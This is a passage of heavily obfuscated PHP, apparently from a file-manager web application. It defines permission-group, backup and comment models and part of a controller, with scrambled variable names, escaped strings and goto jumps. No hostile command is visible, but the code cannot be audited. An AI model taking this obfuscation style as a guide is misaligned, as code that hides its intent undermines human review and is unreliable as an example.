"\x73\157\x72\164"); public function initData() { $×‡Ì’Û = $this->authDefault(); foreach ($×‡Ì’Û as $Û•î´‚í) { $this->add($Û•î´‚í); } } public function findAuth($ñ¹ñÓ·™, $Úèí…ÄÏ) { $”îÖÛíÂ =& $_SERVER[÷åé¼î]; $Û°àıœ„ = parent::listData(); foreach ($Û°àıœ„ as $Ó–‚€æ) { $‰–¹×ûï = intval($Ó–‚€æ[$”îÖÛíÂ[471]]); if ($‰–¹×ûï <= 0 || $Ó–‚€æ[$”îÖÛíÂ[1999]] == 0) { continue; } if (($‰–¹×ûï & $ñ¹ñÓ·™) != $ñ¹ñÓ·™) { continue; } if (($‰–¹×ûï & $Úèí…ÄÏ) != 0) { continue; } return $Ó–‚€æ[$”îÖÛíÂ[459]]; } return !1; } public function findAuthReadOnly() { $à¥ùÜç— = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $™È†ôˆ† = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($à¥ùÜç—, $™È†ôˆ†); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ùúÃÃë =& $_SERVER[÷åé¼î]; $Ü®½ıı« = parent::listData(); $ı”àÑ¯‹ = !1; foreach ($Ü®½ıı« as $âÉ½¢õ¨) { if ($âÉ½¢õ¨[$ùúÃÃë[471]] <= 0 || $âÉ½¢õ¨[$ùúÃÃë[1999]] == $ùúÃÃë[228]) { continue; } if (!$ı”àÑ¯‹) { $ı”àÑ¯‹ = $âÉ½¢õ¨; continue; } if ($ı”àÑ¯‹[$ùúÃÃë[471]] > $âÉ½¢õ¨[$ùúÃÃë[471]]) { $ı”àÑ¯‹ = $âÉ½¢õ¨; } } return $ı”àÑ¯‹ ? $ı”àÑ¯‹[$ùúÃÃë[459]] : $ùúÃÃë[12]; } public function listData($âŒĞ¤¨Ù = false, $áı»Ë²š = "\163\157\x72\x74", $‘¾æÑÙ = false) { return parent::listData($âŒĞ¤¨Ù, $áı»Ë²š, $‘¾æÑÙ); } public function update($ô–ë§é , $ãóìªµ) { $‘À¡å­— =& $_SERVER[÷åé¼î]; $å×Ìè” = parent::listData($ô–ë§é ); $Æ²ÑÄ«ï = $this->findByName($ãóìªµ[$‘À¡å­—[32]]); if (!$å×Ìè” || $Æ²ÑÄ«ï && $Æ²ÑÄ«ï[$‘À¡å­—[459]] != $å×Ìè”[$‘À¡å­—[459]]) { return !1; } $this->filterAuth($ãóìªµ[$‘À¡å­—[471]]); return parent::update($ô–ë§é , $ãóìªµ); } public function remove($ò²Â«Œ†) { $èŠ–—Ğ© = parent::listData($ò²Â«Œ†); if (!$èŠ–—Ğ© || $èŠ–—Ğ©[$_SERVER[÷åé¼î][191]]) { return !1; } return parent::remove($ò²Â«Œ†); } public function add($ß¢ üÁá = array()) { $×¶…œØÙ =& $_SERVER[÷åé¼î]; if ($this->findByName($ß¢ üÁá[$×¶…œØÙ[32]])) { return !1; } $ÏÄÂß”Ì = array($×¶…œØÙ[32] => $×¶…œØÙ[12], $×¶…œØÙ[471] => 1, $×¶…œØÙ[2000] => $×¶…œØÙ[1987], $×¶…œØÙ[1999] => 1, $×¶…œØÙ[191] => 0, $×¶…œØÙ[2001] => 0); $ß¢ üÁá = array_merge($ÏÄÂß”Ì, $ß¢ üÁá); $ß¢ üÁá[$×¶…œØÙ[2001]] = $this->getSort(); $this->filterAuth($ß¢ üÁá[$×¶…œØÙ[471]]); return parent::insert($ß¢ üÁá); } private function getSort() { $ù’ÆºÒº =& $_SERVER[÷åé¼î]; $„Öô×æ = parent::listData(); $İšÈ½‘Ÿ = array_to_keyvalue($„Öô×æ, $ù’ÆºÒº[12], $ù’ÆºÒº[2001]); return empty($İšÈ½‘Ÿ) ? 0 : max($İšÈ½‘Ÿ) + 1; } private function filterAuth(&$ó«…÷‰¢) { if (!$ó«…÷‰¢) { return; } $àüšáŒ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $—ì„ÖÊ = array(); foreach ($àüšáŒ as $şÃÂ”Ú„) { if ($ó«…÷‰¢ & $şÃÂ”Ú„) { $—ì„ÖÊ[] = $şÃÂ”Ú„; } } if (in_array(self::AUTH_ROOT, $—ì„ÖÊ)) { $ó«…÷‰¢ = array_sum($àüšáŒ); return; } $÷¦˜ê„ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($—ì„ÖÊ as $şÃÂ”Ú„) { if (isset($÷¦˜ê„[$şÃÂ”Ú„])) { $—ì„ÖÊ = array_merge($—ì„ÖÊ, $÷¦˜ê„[$şÃÂ”Ú„]); } } $—ì„ÖÊ[] = self::AUTH_SHOW; $ó«…÷‰¢ = array_sum(array_unique($—ì„ÖÊ)); } public function sort($©Á¤§ç®, $·²¹‚Çğ) { return parent::update($©Á¤§ç®, $·²¹‚Çğ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\142\x61\143\x6b\165\160\x4c\151\x73\164"; public $field = array("\x69\x6f", "\156\141\x6d\145", "\163\164\141\x74\165\163", "\143\157\x6e\164\145\156\164", "\x6d\x61\x6e\165\141\154", "\x72\145\x73\165\x6c\164", "\x74\x69\155\145\x46\162\x6f\155", "\x74\x69\x6d\145\x54\157"); public function config() { $Îã§£ĞŞ =& $_SERVER[÷åé¼î]; $Ô“‚œ²« = Model($Îã§£ĞŞ[835])->get($Îã§£ĞŞ[848]); $Ô“‚œ²« = json_decode($Ô“‚œ²«, !0); $Ô“‚œ²« = is_array($Ô“‚œ²«) ? $Ô“‚œ²« : array(); $this->parseContent($Ô“‚œ²«); unset($Ô“‚œ²«[$Îã§£ĞŞ[1749]]); Action($Îã§£ĞŞ[2002])->taskInit(); Model($Îã§£ĞŞ[1748])->cacheClear(); $€‚¹‘¤« = $Îã§£ĞŞ[2003]; $Ù É€Îü = Model($Îã§£ĞŞ[2004])->findByKey($Îã§£ĞŞ[1767], $€‚¹‘¤«); if (!$Ù É€Îü) { $Ù É€Îü = array(); } if (isset($Ù É€Îü[$Îã§£ĞŞ[206]])) { $Ù É€Îü[$Îã§£ĞŞ[206]] = json_decode($Ù É€Îü[$Îã§£ĞŞ[206]], !0); } if (isset($Ô“‚œ²«[$Îã§£ĞŞ[206]])) { $Ù É€Îü[$Îã§£ĞŞ[206]][$Îã§£ĞŞ[1752]] = $Ô“‚œ²«[$Îã§£ĞŞ[206]]; unset($Ô“‚œ²«[$Îã§£ĞŞ[206]]); } return array_merge($Ù É€Îü, $Ô“‚œ²«); } public function listData($ïœÈÍ¯ô = false, $ÍÀíÌ˜Ü = "\x6d\x6f\144\x69\146\171\x54\151\155\145", $‚ŒÆ†¹Û = false) { $Ğ°±êÔ© = parent::listData($ïœÈÍ¯ô, $ÍÀíÌ˜Ü, !0); if (!$Ğ°±êÔ©) { return $Ğ°±êÔ©; } if ($ïœÈÍ¯ô) { $Ğ°±êÔ© = array($Ğ°±êÔ©); } foreach ($Ğ°±êÔ© as &$¶ºÌÀƒ½) { $this->parseContent($¶ºÌÀƒ½); } return $ïœÈÍ¯ô ? $Ğ°±êÔ©[0] : $Ğ°±êÔ©; } public function parseContent(&$•µÏğêÖ) { $ÚéÛ‰Ù¼ =& $_SERVER[÷åé¼î]; if (!$•µÏğêÖ) { return; } $×äÕü­¡ = _get($•µÏğêÖ, $ÚéÛ‰Ù¼[171], $ÚéÛ‰Ù¼[91]); if (!in_array($×äÕü­¡, array($ÚéÛ‰Ù¼[841], $ÚéÛ‰Ù¼[1205]))) { $•µÏğêÖ[$ÚéÛ‰Ù¼[171]] = $×äÕü­¡ == $ÚéÛ‰Ù¼[91] ? $ÚéÛ‰Ù¼[1205] : $ÚéÛ‰Ù¼[841]; } } public function lastItem() { $Öï–– = $this->listData(); return !empty($Öï––[0]) ? $Öï––[0] : null; } public function kill($“ì£˜…˜) { $Ò—Ğ…Ç× =& $_SERVER[÷åé¼î]; $ĞÆÑµ§ = $this->listData($“ì£˜…˜); if (!$ĞÆÑµ§ || empty($ĞÆÑµ§[$Ò—Ğ…Ç×[32]])) { return !0; } Task::kill($Ò—Ğ…Ç×[847]); Task::kill($Ò—Ğ…Ç×[865]); Task::kill($Ò—Ğ…Ç×[874]); $ü‚Î·ùÅ = $ĞÆÑµ§[$Ò—Ğ…Ç×[32]]; $§éş™¾‚ = TEMP_FILES . $Ò—Ğ…Ç×[844] . $ü‚Î·ùÅ . $Ò—Ğ…Ç×[8]; IO::remove($§éş™¾‚, !1); return $this->remove($“ì£˜…˜); } public function remove($³ğ€–»±) { $ÄğŞİ„£ = $this->listData($³ğ€–»±); if (!$ÄğŞİ„£) { return !0; } return $this->backupRemove($ÄğŞİ„£); } private function backupRemove($¹ÀÌò„à) { parent::remove($¹ÀÌò„à[$_SERVER[÷åé¼î][459]]); $À‹™êîè = $this->backupPath($¹ÀÌò„à); IO::remove($À‹™êîè, !1); return !0; } private function backupPath($¶ÎôıÅ) { $âí²İ • =& $_SERVER[÷åé¼î]; $Ê™ö¿Ëñ = $¶ÎôıÅ[$âí²İ •[32]]; $íºé® = Model($âí²İ •[835])->get($âí²İ •[836]); $—õ½¤à = substr(md5($âí²İ •[837] . $íºé® . $Ê™ö¿Ëñ), 0, 8); return "\173\x69\x6f\x3a{$¶ÎôıÅ[$âí²İ •[817]]}\x7d\57\x64\141\164\141\142\141\x73\x65\x2f\142\x61\x63\153\165\x70\57" . $Ê™ö¿Ëñ . $âí²İ •[11] . $—õ½¤à; } public function start() { $ºáïè‘ =& $_SERVER[÷åé¼î]; if ($GLOBALS[$ºáïè‘[6]][$ºáïè‘[92]][$ºáïè‘[2005]] != $ºáïè‘[91]) { return !0; } $»â‘£— = $this->config(); if (!$»â‘£— || $»â‘£—[$ºáïè‘[1749]] != $ºáïè‘[91]) { return !1; } $à¬°¾‰ò = $this->process(); foreach ($à¬°¾‰ò as $‘Ä¡ÒÇ) { if ($‘Ä¡ÒÇ) { return Task::restart($‘Ä¡ÒÇ[$ºáïè‘[459]]); } } $ƒçó„û = new Backup(); $ÄˆÙÍÇ— = $ƒçó„û->db(); if ($ÄˆÙÍÇ—) { $ÄˆÙÍÇ— = $ƒçó„û->dbFile(); if ($ÄˆÙÍÇ— && $»â‘£—[$ºáïè‘[171]] == $ºáïè‘[841]) { $ÄˆÙÍÇ— = $ƒçó„û->file(); } } Backup::set(array($ºáïè‘[815] => 1, $ºáïè‘[826] => time())); return !0; } public function process() { $†åÊÏÍ =& $_SERVER[÷åé¼î]; $îÖğÅù­ = array($†åÊÏÍ[822] => Task::get($†åÊÏÍ[847]), $†åÊÏÍ[827] => Task::get($†åÊÏÍ[865]), $†åÊÏÍ[230] => Task::get($†åÊÏÍ[874])); $µ­şôì© = !1; foreach ($îÖğÅù­ as &$ËÉÌ‰ÜŸ) { if ($µ­şôì©) { $ËÉÌ‰ÜŸ = !1; continue; } if ($ËÉÌ‰ÜŸ) { $ŸùŒÃá« = intval(_get($ËÉÌ‰ÜŸ, $†åÊÏÍ[1784], 0)); if (time() - $ŸùŒÃá« > 7200) { Task::kill($ËÉÌ‰ÜŸ[$†åÊÏÍ[459]]); $µ­şôì© = !0; $ËÉÌ‰ÜŸ = !1; } } } return $îÖğÅù­; } public function restore() { $›Ç©’É =& $_SERVER[÷åé¼î]; ActionCall($›Ç©’É[1132], !0, 1); ActionCall($›Ç©’É[1132], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\145\156\164"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\x61\155\145" => "\x63\157\x6d\x6d\145\156\x74\137\155\x65\164\141", "\155\x65\x74\x61\x46\151\x65\154\x64" => "\x63\157\x6d\x6d\145\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ö§ÍÍá‡) { $óÒ“‚‘ì =& $_SERVER[÷åé¼î]; if ($ö§ÍÍá‡[$óÒ“‚‘ì[2006]]) { $ãòø’áò = $this->where(array($óÒ“‚‘ì[2007] => $ö§ÍÍá‡[$óÒ“‚‘ì[2006]]))->find(); if (!$ãòø’áò || $ãòø’áò[$óÒ“‚‘ì[190]] != $ö§ÍÍá‡[$óÒ“‚‘ì[190]] || $ãòø’áò[$óÒ“‚‘ì[553]] != $ö§ÍÍá‡[$óÒ“‚‘ì[553]]) { return !1; } $this->where(array($óÒ“‚‘ì[2007] => $ö§ÍÍá‡[$óÒ“‚‘ì[2006]]))->setAdd($óÒ“‚‘ì[2008], 1); } $ö§ÍÍá‡[$óÒ“‚‘ì[2009]] = 0; $ö§ÍÍá‡[$óÒ“‚‘ì[2008]] = 0; $ö§ÍÍá‡[$óÒ“‚‘ì[815]] = 1; return $this->add($ö§ÍÍá‡); } public function commentCount($ÂÆş“âÎ, $šÉ£¾ó‚, $¨œÍË ‰ = false) { $‘ßŸ÷ÚÖ =& $_SERVER[÷åé¼î]; if (!$ÂÆş“âÎ) { return array(); } if (is_string($ÂÆş“âÎ) || is_int($ÂÆş“âÎ)) { $ÂÆş“âÎ = array($ÂÆş“âÎ); } $ç»ÃñË» = array($‘ßŸ÷ÚÖ[553], $‘ßŸ÷ÚÖ[2010] => $‘ßŸ÷ÚÖ[549]); $Í¬ƒÉş¯ = array($‘ßŸ÷ÚÖ[553] => array($‘ßŸ÷ÚÖ[7], $ÂÆş“âÎ), $‘ßŸ÷ÚÖ[190] => $šÉ£¾ó‚); if ($¨œÍË ‰) { $Í¬ƒÉş¯[$‘ßŸ÷ÚÖ[1779]] = $¨œÍË ‰; } $´İÎÖÚĞ = $this->field($ç»ÃñË»)->where($Í¬ƒÉş¯)->group($‘ßŸ÷ÚÖ[553])->select(); return array_to_keyvalue($´İÎÖÚĞ, $‘ßŸ÷ÚÖ[553], $‘ßŸ÷ÚÖ[549]); } public function starTarget($î‘­½®, $ÖŒ¯Õİ’) { $Ä‹´ÆŠ =& $_SERVER[÷åé¼î]; $†í›Ñ°÷ = $î‘­½® + self::TYPE_STAR_OFFSET; $»ÊîÙ¡× = array($Ä‹´ÆŠ[1779] => USER_ID, $Ä‹´ÆŠ[190] => $†í›Ñ°÷, $Ä‹´ÆŠ[553] => $ÖŒ¯Õİ’); $ƒé¬ƒ— = $this->where($»ÊîÙ¡×)->find(); if ($ƒé¬ƒ—) { return $this->where(array($Ä‹´ÆŠ[459] => $ƒé¬ƒ—[$Ä‹´ÆŠ[459]]))->delete(); } $²—ĞãŠñ = array($Ä‹´ÆŠ[2006] => 0, $Ä‹´ÆŠ[1779] => USER_ID, $Ä‹´ÆŠ[815] => 1, $Ä‹´ÆŠ[171] => $Ä‹´ÆŠ[12], $Ä‹´ÆŠ[190] => $†í›Ñ°÷, $Ä‹´ÆŠ[553] => $ÖŒ¯Õİ’, $Ä‹´ÆŠ[2009] => 0, $Ä‹´ÆŠ[2008] => 0); return $this->add($²—ĞãŠñ); } public function starTargetCount($èÇÀİı×, $Êƒ¯ğè“) { $ó‰Å±‘Ö =& $_SERVER[÷åé¼î]; $à£©ºËÔ = $Êƒ¯ğè“ + self::TYPE_STAR_OFFSET; $¬ûš§èÓ = $this->commentCount($èÇÀİı×, $à£©ºËÔ); $¬¬ìÁ• = $this->commentCount($èÇÀİı×, $à£©ºËÔ, USER_ID); return array($ó‰Å±‘Ö[2011] => $¬ûš§èÓ, $ó‰Å±‘Ö[2012] => $¬¬ìÁ•); } public function starTargetUserList($Î§¬ËÄª, $ˆŸŞàÊª) { $¬ê¤™¤¸ =& $_SERVER[÷åé¼î]; $ê¾áàíï = $Î§¬ËÄª + self::TYPE_STAR_OFFSET; $‹Ø¿œù¬ = array($¬ê¤™¤¸[553] => $ˆŸŞàÊª, $¬ê¤™¤¸[190] => $ê¾áàíï); $’Êì¼˜È = $this->where($‹Ø¿œù¬)->count(); $¡Ññ¸–ê = array($¬ê¤™¤¸[316] => $’Êì¼˜È, $¬ê¤™¤¸[2013] => array()); if (!$’Êì¼˜È) { return $¡Ññ¸–ê; } $šŸäÕ˜ = $this->field($¬ê¤™¤¸[1779])->where($‹Ø¿œù¬)->limit(500)->select(); $šŸäÕ˜ = array_to_keyvalue($šŸäÕ˜, $¬ê¤™¤¸[12], $¬ê¤™¤¸[1779]); $¡Ññ¸–ê[$¬ê¤™¤¸[2013]] = Model($¬ê¤™¤¸[561])->userListInfo($šŸäÕ˜); return $¡Ññ¸–ê; } public function prasiseUserList($İ›šµ·Ë) { $Å¤¡Áõ =& $_SERVER[÷åé¼î]; $×š–á¢ = array($Å¤¡Áõ[2014] => $İ›šµ·Ë); $ÖÕ »ä = $this->where($×š–á¢)->find(); $şù×ÂµÏ = _get($ÖÕ »ä, $Å¤¡Áõ[2009], 0); $ˆ—‘„¥ = array($Å¤¡Áõ[316] => $şù×ÂµÏ, $Å¤¡Áõ[2013] => array()); if (!$şù×ÂµÏ) { return $ˆ—‘„¥; } $›¨ûÙûé = Model($Å¤¡Áõ[2015])->field($Å¤¡Áõ[1779])->where($×š–á¢)->limit(500)->select(); $›¨ûÙûé = array_to_keyvalue($›¨ûÙûé, $Å¤¡Áõ[12], $Å¤¡Áõ[1779]); $ˆ—‘„¥[$Å¤¡Áõ[2013]] = Model($Å¤¡Áõ[561])->userListInfo($›¨ûÙûé); return $ˆ—‘„¥; } public function remove($ƒÅç†ŠÅ) { $ûù®¦¿ =& $_SERVER[÷åé¼î]; $´åÅ÷åÇ = array($ûù®¦¿[2007] => $ƒÅç†ŠÅ); $Çò’İÛ® = $this->where($´åÅ÷åÇ)->find(); if ($Çò’İÛ®[$ûù®¦¿[2006]]) { $this->where(array($ûù®¦¿[2007] => $Çò’İÛ®[$ûù®¦¿[2006]]))->setAdd($ûù®¦¿[2008], -1); } return $this->where($´åÅ÷åÇ)->delete(); } public function edit($Îõİİ·Ñ, $ÑÌ÷ı˜) { $¼áµõ§ =& $_SERVER[÷åé¼î]; $¨Š±éÙ” = array($¼áµõ§[2007] => $Îõİİ·Ñ); return $this->where($¨Š±éÙ”)->save(array($¼áµõ§[2016] => $ÑÌ÷ı˜)); } public function prasise($Ó÷É°Ÿî) { $ÆÎ‰Ÿ¹ =& $_SERVER[÷åé¼î]; $Ğšêö– = Model($ÆÎ‰Ÿ¹[2017]); $¦ƒØèÕì = array($ÆÎ‰Ÿ¹[2007] => $Ó÷É°Ÿî, $ÆÎ‰Ÿ¹[1770] => USER_ID); $äÏ·Ö¥² = $Ğšêö–->where($¦ƒØèÕì)->find(); if (!$äÏ·Ö¥²) { $Ğšêö–->add($¦ƒØèÕì); $õ’©ãÂğ = $this->where(array($ÆÎ‰Ÿ¹[2007] => $Ó÷É°Ÿî))->setAdd($ÆÎ‰Ÿ¹[2009], 1); } else { $Ğšêö–->where($¦ƒØèÕì)->delete(); $õ’©ãÂğ = $this->where(array($ÆÎ‰Ÿ¹[2007] => $Ó÷É°Ÿî))->setAdd($ÆÎ‰Ÿ¹[2009], -1); } return $õ’©ãÂğ; } public function targetInfo($©Øõ­¹, $Ü‡ïƒÙ) { $ºğâÍŞ =& $_SERVER[÷åé¼î]; $¾õ¯»«³ = array($ºğâÍŞ[632] => $©Øõ­¹, $ºğâÍŞ[633] => $Ü‡ïƒÙ); $Œ×óÂŞ = $this->where($¾õ¯»«³)->count(); $Ø˜Ş½Äç = "\x52\x49\107\x48\x54\x20\112\x4f\111\116\x20{$this->tablePrefix}\143\157\155\x6d\145\x6e\164\137\160\x72\x61\x69\x73\x65\40\163\x74\x61\162\40\x6f\156\40\143\x6f\155\155\145\156\164\56\x63\157\x6d\155\x65\x6e\x74\x49\104\40\75\x20\x73\164\141\162\56\143\157\x6d\x6d\145\x6e\x74\111\104"; $…ÆÄçÓ = $this->alias($ºğâÍŞ[414])->where($¾õ¯»«³)->join($Ø˜Ş½Äç, $ºğâÍŞ[2018])->count(); $ª“àäşí = array($ºğâÍŞ[2019] => $Œ×óÂŞ, $ºğâÍŞ[2020] => $…ÆÄçÓ); return $ª“àäşí; } public function listData($Ö×¤ Ìµ) { $öÆªÎ²ß =& $_SERVER[÷åé¼î]; if (isset($Ö×¤ Ìµ[$öÆªÎ²ß[2021]])) { if ($Ö×¤ Ìµ[$öÆªÎ²ß[2021]]) { $Ö×¤ Ìµ[$öÆªÎ²ß[2014]] = array($öÆªÎ²ß[1086], intval($Ö×¤ Ìµ[$öÆªÎ²ß[2021]])); } unset($Ö×¤ Ìµ[$öÆªÎ²ß[2021]]); } if (isset($Ö×¤ Ìµ[$öÆªÎ²ß[2022]])) { if ($Ö×¤ Ìµ[$öÆªÎ²ß[2022]]) { $Ö×¤ Ìµ[$öÆªÎ²ß[2014]] = array($öÆªÎ²ß[1083], intval($Ö×¤ Ìµ[$öÆªÎ²ß[2022]])); } unset($Ö×¤ Ìµ[$öÆªÎ²ß[2022]]); } return $this->_listData($Ö×¤ Ìµ); } private function _listData($Û·ö±¢ï) { $ÏÛÆ³ =& $_SERVER[÷åé¼î]; $¢œ¥¬Şç = $this->where($Û·ö±¢ï)->_makeOrder()->selectPage(100); $this->_listAppendParent($¢œ¥¬Şç[$ÏÛÆ³[429]]); $this->_listAppendUser($¢œ¥¬Şç[$ÏÛÆ³[429]]); $this->_listAppendMeta($¢œ¥¬Şç[$ÏÛÆ³[429]]); return $¢œ¥¬Şç; } private function _makeOrder() { $±Ç·á®Î =& $_SERVER[÷åé¼î]; $ğ¾ñº = array($±Ç·á®Î[2009], $±Ç·á®Î[2008], $±Ç·á®Î[231]); $Ñ•„ÆÀº = Input::get($±Ç·á®Î[514], $±Ç·á®Î[7], $±Ç·á®Î[481], $ğ¾ñº); $¶«Ò­ş÷ = Input::get($±Ç·á®Î[515], $±Ç·á®Î[7], $±Ç·á®Î[1772], array($±Ç·á®Î[2023], $±Ç·á®Î[510])); $ëøÁ’¶  = $Ñ•„ÆÀº . $±Ç·á®Î[53] . $¶«Ò­ş÷; return $this->order($ëøÁ’¶ ); } private function _listAppendParent(&$İÌö“†©) { $Çñ¦ˆ± =& $_SERVER[÷åé¼î]; $ºØşéÜ = array_unique(array_to_keyvalue($İÌö“†©, $Çñ¦ˆ±[12], $Çñ¦ˆ±[2006])); $ºØşéÜ = array_remove_value($ºØşéÜ, $Çñ¦ˆ±[228]); if (!$ºØşéÜ) { return; } $Ñ»âû²¸ = $this->where(array($Çñ¦ˆ±[2007] => array($Çñ¦ˆ±[7], $ºØşéÜ)))->select(); $Ñ»âû²¸ = array_to_keyvalue($Ñ»âû²¸, $Çñ¦ˆ±[2014]); foreach ($İÌö“†© as &$©ú¡»—) { if (isset($Ñ»âû²¸[$©ú¡»—[$Çñ¦ˆ±[2006]]])) { $©ú¡»—[$Çñ¦ˆ±[2024]] = $Ñ»âû²¸[$©ú¡»—[$Çñ¦ˆ±[2006]]]; } } unset($©ú¡»—); } private function _listAppendUser(&$åè•”À) { $Ï¬ˆæ—Ì =& $_SERVER[÷åé¼î]; $úÓÌóı = array_unique(array_to_keyvalue($åè•”À, $Ï¬ˆæ—Ì[12], $Ï¬ˆæ—Ì[1779])); $úÓÌóı = array_remove_value($úÓÌóı, $Ï¬ˆæ—Ì[228]); if (count($úÓÌóı) == 0) { return; } foreach ($åè•”À as $Œ–Ş”®•) { if (isset($Œ–Ş”®•[$Ï¬ˆæ—Ì[2024]])) { $úÓÌóı[] = $Œ–Ş”®•[$Ï¬ˆæ—Ì[2024]][$Ï¬ˆæ—Ì[1779]]; } } $ú•›¡À = Model($Ï¬ˆæ—Ì[582])->userListInfo($úÓÌóı); foreach ($åè•”À as &$Œ–Ş”®•) { $Œ–Ş”®•[$Ï¬ˆæ—Ì[646]] = $ú•›¡À[$Œ–Ş”®•[$Ï¬ˆæ—Ì[1779]]]; if (isset($Œ–Ş”®•[$Ï¬ˆæ—Ì[2024]])) { $Œ–Ş”®•[$Ï¬ˆæ—Ì[2024]][$Ï¬ˆæ—Ì[646]] = $ú•›¡À[$Œ–Ş”®•[$Ï¬ˆæ—Ì[2024]][$Ï¬ˆæ—Ì[1779]]]; } } unset($Œ–Ş”®•); } private function _listAppendMeta(&$å¥äŠ­£) { $Ï¬áÂ»‚ =& $_SERVER[÷åé¼î]; $¨±ì°áÑ = array_unique(array_to_keyvalue($å¥äŠ­£, $Ï¬áÂ»‚[12], $Ï¬áÂ»‚[2014])); $¨±ì°áÑ = array_remove_value($¨±ì°áÑ, $Ï¬áÂ»‚[228]); if (!$¨±ì°áÑ) { return; } foreach ($å¥äŠ­£ as $¾´¥ÛÜ) { if (isset($¾´¥ÛÜ[$Ï¬áÂ»‚[2024]])) { $¨±ì°áÑ[] = $¾´¥ÛÜ[$Ï¬áÂ»‚[2024]][$Ï¬áÂ»‚[2014]]; } } $ˆÔ¯æƒ = $this->metaList($¨±ì°áÑ); if (!$ˆÔ¯æƒ) { return !1; } foreach ($å¥äŠ­£ as &$¾´¥ÛÜ) { $¾´¥ÛÜ[$Ï¬áÂ»‚[523]] = $ˆÔ¯æƒ[$¾´¥ÛÜ[$Ï¬áÂ»‚[2014]]]; if (isset($¾´¥ÛÜ[$Ï¬áÂ»‚[2024]])) { $¾´¥ÛÜ[$Ï¬áÂ»‚[2024]][$Ï¬áÂ»‚[523]] = $ˆÔ¯æƒ[$¾´¥ÛÜ[$Ï¬áÂ»‚[2024]][$Ï¬áÂ»‚[2014]]]; } } unset($¾´¥ÛÜ); } private function metaList($æâšÓò‡) { $€ÒŠôã” =& $_SERVER[÷åé¼î]; if (!$æâšÓò‡) { return array(); } $ìúÃàÄØ = array($€ÒŠôã”[2014] => array($€ÒŠôã”[7], $æâšÓò‡)); $†—³÷…Î = Model($€ÒŠôã”[2025])->where($ìúÃàÄØ)->select(); $†—³÷…Î = array_to_keyvalue_group($†—³÷…Î, $€ÒŠôã”[2014]); foreach ($†—³÷…Î as $²Æë¼ÑŠ => $–›Ûü–¾) { $±¡Ü•ÁÒ = array(); foreach ($–›Ûü–¾ as $ñƒ‹€¹‹) { $±¡Ü•ÁÒ[$ñƒ‹€¹‹[$€ÒŠôã”[97]]] = $ñƒ‹€¹‹[$€ÒŠôã”[434]]; } $†—³÷…Î[$²Æë¼ÑŠ] = $±¡Ü•ÁÒ; } return $†—³÷…Î ? $†—³÷…Î : array(); } public function removeTarget($ãÑïé•¬, $ößÑ‰ó) { $Å£ÈûÀ‹ =& $_SERVER[÷åé¼î]; if (!$ößÑ‰ó) { return !0; } $ößÑ‰ó = is_array($ößÑ‰ó) ? $ößÑ‰ó : array($ößÑ‰ó); $¦ÃÔä»ª = array($Å£ÈûÀ‹[190] => $ãÑïé•¬, $Å£ÈûÀ‹[553] => array($Å£ÈûÀ‹[7], $ößÑ‰ó)); $ÃÑÖëÉô = $this->field($Å£ÈûÀ‹[2014])->where($¦ÃÔä»ª)->select(); $ì¨ğã¯Ì = array_to_keyvalue($ÃÑÖëÉô, $Å£ÈûÀ‹[12], $Å£ÈûÀ‹[2014]); if (!$ì¨ğã¯Ì) { return !0; } $¦ÃÔä»ª = array($Å£ÈûÀ‹[2014] => array($Å£ÈûÀ‹[7], $ì¨ğã¯Ì)); $this->where($¦ÃÔä»ª)->delete(); Model($Å£ÈûÀ‹[2017])->where($¦ÃÔä»ª)->delete(); Model($Å£ÈûÀ‹[2026])->where($¦ÃÔä»ª)->delete(); } } goto A‡æº‘È; bÃÕˆÅøÔË: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ûê…¨€° =& $_SERVER[÷åé¼î]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ûê…¨€°[6]] =& $config; $this->values[$ûê…¨€°[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ûê…¨€°[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($¸úÊ¬·†) { if (1 === func_num_args()) { $this->{$¸úÊ¬·†} = new $¸úÊ¬·†(); } else { $ÖÎ¨·şµ = new ReflectionClass($¸úÊ¬·†); $–÷ë€¹½ = func_get_args(); array_shift($–÷ë€¹½); $this->{$¸úÊ¬·†} = $ÖÎ¨·şµ->newInstanceArgs($–÷ë€¹½); } return $this->{$¸úÊ¬·†}; } public function routeBind($ç¾ÓÁ¼æ, $›™íÓÑ, $‰ªÜòå = 3) { $Ô–á•ôà =& $_SERVER[÷åé¼î]; $Í¡øîÏ³ = $this->in[$Ô–á•ôà[9]]; $ç¾ÓÁ¼æ = str_replace($Ô–á•ôà[10], $Ô–á•ôà[11], trim(trim($ç¾ÓÁ¼æ, $Ô–á•ôà[8]), $Ô–á•ôà[12])); if (!$ç¾ÓÁ¼æ || count($Í¡øîÏ³) <= $‰ªÜòå) { return !1; } $ï·à©ÜÎ = !0; $¬ê»¥Ù¡ = explode($Ô–á•ôà[8], $ç¾ÓÁ¼æ); for ($Ò“ĞÜ²‰ = 0; $Ò“ĞÜ²‰ < count($¬ê»¥Ù¡); $Ò“ĞÜ²‰++) { if ($¬ê»¥Ù¡[$Ò“ĞÜ²‰] != $Í¡øîÏ³[$‰ªÜòå + $Ò“ĞÜ²‰]) { $ï·à©ÜÎ = !1; break; } } if 